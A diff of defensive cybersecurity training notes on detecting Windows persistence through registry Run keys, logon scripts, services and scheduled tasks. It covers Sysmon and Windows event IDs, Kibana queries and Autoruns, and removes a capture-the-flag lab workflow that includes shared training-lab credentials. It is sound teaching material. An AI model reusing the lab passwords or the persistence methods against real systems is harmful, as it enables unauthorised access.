+For device investigations, the Autoruns tool can be used to spot logon scripts.
 
-Username: trainee@jdmss.lan
-Password: CyberTraining1!
+------------------------
+
+Windows Service
+Services are computer programs that run in the background. Instead of interacting with the user directly, the intention is to add increased functionality to the Windows Operating System (OS). They offer system resources to accomplish background tasks like handling remote procedure calls or internet information services. Not every executable can be registered as a Windows service; they must be able to interact with the Windows Service Control Manager (services.exe) or they are killed on startup.
+
 ﻿
 
-5. Run a search over the given time range Dec 6, 2021 @ 17:00:00.000 → Dec 6, 2021 @ 18:00:00.000.
+Adversaries often create a new service or modify an existing service as a way to maintain persistence. Services can be modified using the reg command or the sc command. Information about services is stored in the HKLM\SYSTEM\CurrentControlSet\Services registry key.
 
 ﻿
 
-There are more than 129,000 events, which is too many to manually sift through.
+Detecting Persistence via Windows Service
+﻿
 
-﻿![image](https://github.com/user-attachments/assets/cfd1d68c-03a2-4774-85d4-64ddcc2dd027)
+If a service is modified those changes are reflected in the HKLM\SYSTEM\CurrentControlSet\Services registry key. This key can be monitored using the following:
 
-6. Narrow the results by searching for Sysmon registry events 12, 13, or 14.
-event.code: (12 OR 13 OR 14)
+Sysmon event ID 12 (RegistryEvent [Object create and delete])
+Sysmon event ID 13 (RegistryEvent [Value Set])
+Sysmon event ID 14 (RegistryEvent [Key and Value Rename])
+Checking for a suspicious process call tree is another method of detection. Often valid services can be used to call malicious files. For example, Microsoft Word launching a malicious script. This can be detected using Sysmon event ID 1.
 
+﻿
 
+A useful event ID for monitoring service activity is Windows event ID 4697 (A service was installed in the system). Monitoring for this event is recommended, especially on high-value assets or computers, because a new service installation should be planned and expected. Unexpected service installation should trigger an alert.
 
-There are now more than 2,000 events, which is still too many to analyze one by one.
+﻿
 
-![image](https://github.com/user-attachments/assets/18f59e82-9cb6-492c-8867-ac95e22707cb)
+Listed below are Microsoft's security monitoring recommendations for this event ID:
 
-7. There are several registry keys that have the word Run in their paths. Try searching for all events where registry.path has the word Run in it.
-event.code: (12 OR 13 OR 14) AND registry.path: Run
-
-![image](https://github.com/user-attachments/assets/fc0e284c-f893-4a5d-a3aa-7c26d430a707)
-
-
-
-8. Make the events more readable by adding the following fields:
-host.name
-winlog.user.identifier
-event.code
-event.action
-registry.path
-winlog.event_data.Details
-winlog.event_data.EventType
-
-![image](https://github.com/user-attachments/assets/4249e192-65a7-4f0c-a577-d25d6ee9bcca)
+Monitor for all events where Service File Name is not located in %windir% or Program Files/Program Files (x86) folders. Typically new services are located in these folders.
+Report all Service Type equals 0x1 (KernelDriver), 0x2 (FileSystemDriver), or 0x8 (RecognizerDriver). These service types start first and have almost unlimited access to the OS from the beginning of the OS startup. These types are rarely installed.
+Report all Service Start Type equals 0 (Boot) or 1 (System). These service start types are used by drivers, which have unlimited access to the OS.
+Report all Service Start Type equals 4 (Disabled). It is not common to install a new service in the Disabled state.
+Report all Service Account not equals localSystem, localService or networkService to identify services that are running under a user account.
+Autoruns is a useful tool when triaging a machine for persistence. Not only does it list all the information for Windows autorun locations but it also sends the hash of each file to VirusTotal to be compared against their database of known good and known m alicious binarie s. Autoruns can also submit the image (actual file) of unknown hashes, but it is not configured to do so by default. Submitting the image of unknow n hashes to V irusTotal should only be done if the network policy allows it.
 
 
+------------------
 
-This looks like suspicious activity. It is rare that a legitimate file runs directly from the root of C:\. This file location needs to be investigated and reported.
+Scheduled Task
+Starting with Windows 95, Microsoft packaged a task scheduler with its OS to start and restart predefined tasks at pre-set times. This makes it an ideal tool for an adversary to obtain persistence. For example, an adversary sets up a scheduled task to execute a script regularly or upon startup that checks to make sure the backdoor is active and if it is not, to have the script activate it.
 
+﻿
 
-9. Check for additional persistence activity using the logon script method.
-event.code: (12 OR 13 OR 14) AND registry.path: UserInitMprLogonScript
+Detecting Persistence via Scheduled Tasks
+﻿
 
-![image](https://github.com/user-attachments/assets/9056ceb2-1fcf-4b70-a2bd-1174d6264d92)
+Monitor process execution from svchost.exe (Windows 10) and taskeng.exe (all versions older than Windows 10).
 
-The adversary is also using the user logon script method as an additional persistence method. This registry location would also need to be remediated. Two forms of persistence were found on ch-dev-1, a common registry run key and a logon script.
+﻿
 
-![image](https://github.com/user-attachments/assets/5fd66237-8192-40e0-a7ff-e637c2852ee3)
+There are several Windows event IDs, listed below, that can be utilized to hunt for malicious scheduled task activity.
 
+Event ID 106 on Windows 7, Server 2008 R2 — Scheduled task registered
+Event ID 140 on Windows 7, Server 2008 R2/4702 on Windows 10, Server 2016 — Scheduled task updated
+Event ID 141 on Windows 7, Server 2008 R2/4699 on Windows 10, Server 2016 — Scheduled task deleted
+Event ID 4698 on Windows 10, Server 2016 — Scheduled task created
+Event ID 4700 on Windows 10, Server 2016 — Scheduled task enabled
+Event ID 4701 on Windows 10, Server 2016 — Scheduled task disabled
+The Windows Task Scheduler files are stored in %SYSTEMROOT%\System32\Tasks. This location can be monitored for changes in an attempt to detect malicious activity. Autoruns is a useful tool when triaging a host for persistence via scheduled tasks. 
 
-
-------------------------------------
+-----------
 
 Challenge: Detecting Windows Persistence
 This challenge is a capture-the-flag scenario meant to put the knowledge gained from this lesson to the test.
@@ -3602,84 +3256,9 @@ The flags look like this: 1FAD2399-DF1F-4C0D-A6C0-4266B725BC5B.
 
 NOTE: The group of Knowledge Checks that follow this task refers to the challenge, and asks in which persistence method each file and UUID were found. This requires you to take detailed notes. 
 
-﻿
+﻿------------------------------
 
-Workflow
-
-﻿
-
-1. Log in to the ch-treasr-1 VM using the following credentials.
-
-Username: trainee
-Password: CyberTraining1!
-﻿
-
-2. Log in to the win-hunt VM using the following credentials:
-
-Username: trainee
-Password: CyberTraining1!
-﻿
-
-3. Open Chrome.
-
-﻿
-
-4. Select the Discover - Elastic bookmark. The time range for this challenge is Dec 21, 2021 @ 00:00:00.000 -> Dec 21, 2021 @ 23:30:00.000.
-
-﻿
-
-5. Log in to Security Onion using the following credentials:
-
-Username: trainee@jdmss.lan
-Password: CyberTraining1!
-﻿
-
-Once logged into Security Onion and ch-treasr-1, the challenge begins.
-
-﻿
-
-Make notes on what persistence methods are used and which file and UUID were found in the persistence locations. This information is needed to answer the Knowledge Checks that follow.
-
--------------------------------
-
-![image](https://github.com/user-attachments/assets/173b0948-1cff-4969-b547-92e655d85f8c)
-
-![image](https://github.com/user-attachments/assets/e64731a5-40ab-48df-9956-5d5f7d1b9b35)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+ 
 
 
 
